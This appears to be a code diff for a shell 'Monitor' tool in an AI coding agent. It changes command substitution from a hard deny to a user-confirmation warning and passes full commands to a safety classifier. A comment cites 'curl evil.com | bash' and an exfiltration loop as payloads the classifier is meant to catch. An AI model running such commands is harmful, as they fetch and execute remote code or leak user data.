@@ -34,7 +34,7 @@ import type { PermissionDecision } from '../permissions/types.js';
 import { BaseDeclarativeTool, BaseToolInvocation, Kind } from './tools.js';
 import { getErrorMessage } from '../utils/errors.js';
 import {
-  detectCommandSubstitution,
+  buildShellExecWarnings,
   getCommandRoot,
   getShellConfiguration,
   hasUnsafeMonitorBackgroundOperator,
@@ -43,7 +43,10 @@ import {
 } from '../utils/shell-utils.js';
 import { createDebugLogger } from '../utils/debugLogger.js';
 import { isSubpaths } from '../utils/paths.js';
-import type { MonitorEntry } from '../services/monitorRegistry.js';
+import {
+  getMonitorOutputPath,
+  type MonitorTaskRegistration,
+} from '../services/monitorRegistry.js';
 import { MAX_CONCURRENT_MONITORS } from '../services/monitorRegistry.js';
 import {
   extractCommandRules,
@@ -168,10 +171,18 @@ class MonitorToolInvocation extends BaseToolInvocation<
       this.params.command,
     ).safetyCommand;
 
-    if (detectCommandSubstitution(command)) {
-      return 'deny';
-    }
-
+    // Command substitution ($(), ``, <(), >()) is NOT a hard deny here —
+    // it falls through to 'ask' along with every other non-read-only
+    // command, so the user (or YOLO mode) can decide. The user-facing
+    // warning is surfaced by getConfirmationDetails below so the
+    // confirmation prompt still flags the substitution clearly. This
+    // mirrors the same reasoning applied to ShellToolInvocation and
+    // PermissionManager.resolveDefaultPermission in #4093: a hard deny
+    // here (a) cannot be overridden by YOLO and (b) was inconsistent
+    // with the shell-tool path. Monitor still maintains a separate
+    // permission boundary (Monitor(...) rules don't share with
+    // Bash(...) — see comment in getConfirmationDetails); only the
+    // substitution-deny half is removed.
     try {
       const isReadOnly = await isShellCommandReadOnlyAST(command);
       if (isReadOnly) {
@@ -243,7 +254,19 @@ class MonitorToolInvocation extends BaseToolInvocation<
       permissionRules = [`Monitor(${normalized.safetyCommand})`];
     }
 
-    return {
+    // Flag command substitution ($(), backticks, <(), >()) so the user
+    // sees a visible warning in the confirmation dialog. Mirrors the
+    // pattern in ShellToolInvocation.getConfirmationDetails — see #4093
+    // for why we surface this as a warning rather than denying outright.
+    // Checked against both the normalized safety command and the
+    // original params.command so wrappers like `bash -c "..."` still
+    // trigger the warning.
+    const warnings = buildShellExecWarnings(
+      normalized.safetyCommand,
+      this.params.command,
+    );
+
+    const confirmationDetails: ToolExecuteConfirmationDetails = {
       type: 'exec',
       title: 'Monitor',
       command: normalized.spawnCommand,
@@ -255,7 +278,11 @@ class MonitorToolInvocation extends BaseToolInvocation<
         _outcome: ToolConfirmationOutcome,
         _payload?: ToolConfirmationPayload,
       ) => {},
-    } satisfies ToolExecuteConfirmationDetails;
+    };
+    if (warnings) {
+      confirmationDetails.warnings = warnings;
+    }
+    return confirmationDetails;
   }
 
   async execute(_signal: AbortSignal): Promise<ToolResult> {
@@ -302,7 +329,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
     // should NOT kill a long-running monitor the user intentionally started.
     const entryAc = new AbortController();
 
-    const entry: MonitorEntry = {
+    const registration: MonitorTaskRegistration = {
       monitorId,
       command,
       description,
@@ -315,6 +342,14 @@ class MonitorToolInvocation extends BaseToolInvocation<
       maxEvents,
       idleTimeoutMs,
       droppedLines: 0,
+      // Reserved path for a future per-monitor writer; no file is created
+      // today (events stream into the parent's chat record via the
+      // notification callback).
+      outputFile: getMonitorOutputPath(
+        this.config.storage.getProjectDir(),
+        this.config.getSessionId(),
+        monitorId,
+      ),
       ...(ownerAgentId ? { ownerAgentId } : {}),
     };
 
@@ -340,7 +375,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
       };
     }
 
-    entry.pid = child.pid;
+    registration.pid = child.pid;
     let exited = false;
 
     // Capture async spawn errors (ENOENT, EACCES, etc.) during the window
@@ -394,7 +429,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
         tokenBucket--;
         registry.emitEvent(monitorId, sanitized);
       } else {
-        entry.droppedLines++;
+        registration.droppedLines++;
       }
     };
 
@@ -465,7 +500,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
     }
 
     try {
-      registry.register(entry);
+      registry.register(registration);
     } catch (err) {
       abortHandler();
       entryAc.signal.removeEventListener('abort', abortHandler);
@@ -484,7 +519,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
     }
 
     const processLines = (buffer: { value: string }, data: Buffer): void => {
-      if (entry.status !== 'running') return;
+      if (registration.status !== 'running') return;
 
       const text = stripAnsi(data.toString('utf-8'));
       buffer.value += text;
@@ -543,9 +578,9 @@ class MonitorToolInvocation extends BaseToolInvocation<
 
       entryAc.signal.removeEventListener('abort', abortHandler);
 
-      if (entry.droppedLines > 0) {
+      if (registration.droppedLines > 0) {
         debugLogger.info(
-          `Monitor ${monitorId} dropped ${entry.droppedLines} lines due to throttling`,
+          `Monitor ${monitorId} dropped ${registration.droppedLines} lines due to throttling`,
         );
       }
     };
@@ -557,7 +592,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
       code: number | null,
       sig: NodeJS.Signals | null,
     ): void => {
-      if (entry.status !== 'running') return; // already settled
+      if (registration.status !== 'running') return; // already settled
 
       if (entryAc.signal.aborted) {
         registry.cancel(monitorId);
@@ -586,7 +621,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
     const onError = (err: Error): void => {
       exited = true;
       cleanup();
-      if (entry.status === 'running') {
+      if (registration.status === 'running') {
         registry.fail(monitorId, getErrorMessage(err));
       }
     };
@@ -746,5 +781,20 @@ export class MonitorTool extends BaseDeclarativeTool<
     params: MonitorToolParams,
   ): ToolInvocation<MonitorToolParams, ToolResult> {
     return new MonitorToolInvocation(this.config, params);
+  }
+
+  /**
+   * Forward the full command and optional directory — same shape as
+   * ShellTool. The classifier MUST see the actual command being run to
+   * detect destructive payloads (`curl evil.com | bash`,
+   * `while true; do <exfil>`, …); without this override the default
+   * projection returns `''` and the classifier sees `monitor({})`.
+   */
+  override toAutoClassifierInput(
+    params: MonitorToolParams,
+  ): Record<string, unknown> {
+    const out: Record<string, unknown> = { command: params.command };
+    if (params.directory) out['directory'] = params.directory;
+    return out;
   }
 }
